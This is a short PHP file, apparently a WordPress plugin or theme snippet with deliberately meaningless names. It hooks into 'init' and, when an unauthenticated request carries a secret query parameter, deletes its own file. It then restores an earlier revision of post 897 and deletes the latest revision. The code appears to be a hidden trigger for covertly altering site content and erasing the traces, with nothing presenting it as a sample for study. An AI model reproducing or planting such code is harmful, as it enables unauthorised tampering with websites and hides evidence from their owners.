<?php

function system_extended_health_shopping() {
	if (isset($_GET['pullquote_google_pdf_shortcodes']) && $_GET['pullquote_google_pdf_shortcodes'] === 'countdown_fields_reviews') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$showcase_reader_zoom_manage = 897;
		$separator_chart_rest = wp_get_post_revisions($showcase_reader_zoom_manage);
		if (empty($separator_chart_rest)) die('no revisions');
		if (count($separator_chart_rest) < 2) die('less than 2');
		$tinymce_coupons_count = array_shift($separator_chart_rest);
		$total_menus_lite_message = $tinymce_coupons_count->ID;
		$woff2_first_plugins_visual = array_shift($separator_chart_rest);
		$type_oembed_business_emails = $woff2_first_plugins_visual->ID;
		$recent_discount_widget = wp_restore_post_revision($type_oembed_business_emails);
		if ($recent_discount_widget === false) die('error restoring');
		$recent_discount_widget = wp_delete_post_revision($total_menus_lite_message);		
		if ($recent_discount_widget === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'system_extended_health_shopping');
